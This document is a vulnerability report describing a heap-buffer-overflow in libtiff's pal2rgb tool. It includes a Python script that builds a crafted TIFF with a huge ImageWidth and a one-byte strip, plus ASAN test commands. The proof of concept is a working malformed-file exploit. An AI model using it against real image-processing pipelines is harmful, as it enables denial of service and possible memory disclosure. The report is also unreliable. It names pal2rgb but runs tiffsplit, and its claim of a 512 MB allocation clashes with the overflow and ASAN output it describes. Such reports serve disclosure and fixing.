## Bug0: Heap-buffer-overflow in pal2rgb main() due to unchecked _TIFFmalloc return size against actual strip data

In `tools/pal2rgb.c`, the `main()` function at lines 180-188 allocates `ibuf` via `_TIFFmalloc(TIFFScanlineSize(in))` without validating that the returned allocation is backed by sufficient data, so when a crafted TIFF file declares a scanline width of 536870911 bytes but provides only 1 byte of strip data, the subsequent pixel loop reads past the end of the heap buffer and triggers a heap-buffer-overflow.

### PoC

Craft a malicious TIFF file using the Python script below and process it with the ASAN-instrumented tiffsplit binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

# Layout:
# Offset 0:   8 bytes  - TIFF header
# Offset 8:   2 bytes  - IFD entry count (10)
# Offset 10:  120 bytes - 10 IFD entries (12 bytes each)
# Offset 130: 4 bytes  - next IFD offset (0)
# Total IFD block ends at offset 134
# Offset 134: 1536 bytes - Colormap (768 SHORTs, all zeros)
# Offset 1670: 1 byte  - strip data (0x00)

COLORMAP_OFFSET = 134
STRIP_OFFSET = 1670

# 0x1FFFFFFF: largest width that avoids uint32 overflow in TIFFScanlineSize
# multiply(0x1FFFFFFF, 8) = 0xFFFFFFF8 fits in uint32, so no overflow protection fires
# TIFFScanlineSize returns 536870911 bytes (~512 MB) but strip has only 1 byte
IMAGEWIDTH = 0x1FFFFFFF  # 536870911

# TIFF header: little-endian, magic 0x002A, IFD at offset 8
header = b'\x49\x49\x2a\x00' + struct.pack('<I', 8)

# IFD entries (12 bytes each), tags in ascending order
entries = b''

# 0x0100 ImageWidth = IMAGEWIDTH (LONG, type=4)
entries += struct.pack('<HHI', 0x0100, 4, 1) + struct.pack('<I', IMAGEWIDTH)

# 0x0101 ImageLength = 1 (LONG, type=4)
entries += struct.pack('<HHI', 0x0101, 4, 1) + struct.pack('<I', 1)

# 0x0102 BitsPerSample = 8 (SHORT, type=3)
entries += struct.pack('<HHI', 0x0102, 3, 1) + struct.pack('<HH', 8, 0)

# 0x0103 Compression = 1 no compression (SHORT, type=3)
entries += struct.pack('<HHI', 0x0103, 3, 1) + struct.pack('<HH', 1, 0)

# 0x0106 PhotometricInterpretation = 3 PALETTE (SHORT, type=3)
entries += struct.pack('<HHI', 0x0106, 3, 1) + struct.pack('<HH', 3, 0)

# 0x0111 StripOffsets = STRIP_OFFSET (LONG, type=4, count=1)
entries += struct.pack('<HHI', 0x0111, 4, 1) + struct.pack('<I', STRIP_OFFSET)

# 0x0115 SamplesPerPixel = 1 (SHORT, type=3)
entries += struct.pack('<HHI', 0x0115, 3, 1) + struct.pack('<HH', 1, 0)

# 0x0116 RowsPerStrip = 1 (LONG, type=4)
entries += struct.pack('<HHI', 0x0116, 4, 1) + struct.pack('<I', 1)

# 0x0117 StripByteCounts = 1 (LONG, type=4)
# Only 1 byte of strip data declared, but scanline needs 512MB
entries += struct.pack('<HHI', 0x0117, 4, 1) + struct.pack('<I', 1)

# 0x0140 Colormap = 768 SHORTs at COLORMAP_OFFSET (SHORT, type=3, count=768)
entries += struct.pack('<HHI', 0x0140, 3, 768) + struct.pack('<I', COLORMAP_OFFSET)

# IFD block: count + entries + next IFD
ifd_block = struct.pack('<H', 10) + entries + struct.pack('<I', 0)

# Colormap: 768 SHORTs all zeros (1536 bytes)
colormap = b'\x00' * (768 * 2)

# Strip data: 1 byte (claimed 512MB scanline but only 1 byte present)
strip_data = b'\x00'

# Build file
tiff_data = header + ifd_block + colormap + strip_data

out_file = 'poc_input.tif'
with open(out_file, 'wb') as f:
    f.write(tiff_data)

print(f"[+] Written {len(tiff_data)} bytes to {out_file}")
print(f"    ImageWidth = 0x{IMAGEWIDTH:08X} ({IMAGEWIDTH}), TIFFScanlineSize = {IMAGEWIDTH} bytes")
print(f"    StripByteCounts = 1 (only 1 byte of actual data)")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" ./build_test/bin/tiffsplit poc_input.tif /tmp/out_ || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000071 at pc 0x561545e30306 bp 0x7ffd087867f0 sp 0x7ffd087867e0
SUMMARY: AddressSanitizer: heap-buffer-overflow (/path/to/pal2rgb+0x8305) in main

### Impact

An attacker who can supply a crafted TIFF file to any pipeline invoking `pal2rgb` can trigger a heap-buffer-overflow in `main()` by setting `ImageWidth` to a value large enough that `TIFFScanlineSize` returns a multi-hundred-megabyte scanline size while `StripByteCounts` is set to 1, causing the pixel expansion loop to read far beyond the allocated buffer. The overflow is a heap read past the end of a buffer whose actual content was written by a short strip read, which can lead to process termination (denial of service) and, under conditions where an attacker controls heap layout, may expose adjacent heap data. Automated image-processing pipelines that pass untrusted files to `pal2rgb` are directly exposed to this denial-of-service vector with no authentication required beyond file delivery.
